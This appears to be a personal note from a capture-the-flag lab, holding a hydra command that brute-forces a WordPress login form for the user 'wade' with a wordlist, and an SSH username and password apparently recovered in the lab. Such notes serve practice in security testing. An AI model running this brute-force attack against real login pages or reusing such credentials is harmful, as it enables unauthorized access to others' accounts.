# COMMAND
- hydra -l wade -P docsword_sorted.txt -vV 10.10.180.193 http-form-post "/retro/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fretro%2wp-admin%2F&testcookie=1:200"

# CREDS
## SSH 
santa:rudolphrednosedreindeer
